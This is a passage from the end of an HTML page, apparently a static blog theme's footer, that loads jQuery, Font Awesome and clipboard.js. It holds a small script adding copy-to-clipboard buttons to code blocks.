</footer>

    </div>
    <!-- styles -->


 
  <link
    rel="preload"
    href="/lib/font-awesome/css/all.min.css"
    as="style"
    onload="this.onload=null;this.rel='stylesheet'"
  />
  <noscript
    ><link
      rel="stylesheet"
      href="/lib/font-awesome/css/all.min.css"
  /></noscript>


    <!-- jquery -->

  
<script src="/lib/jquery/jquery.min.js"></script>





<!-- clipboard -->

  
    
<script src="/lib/clipboard/clipboard.min.js"></script>

  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
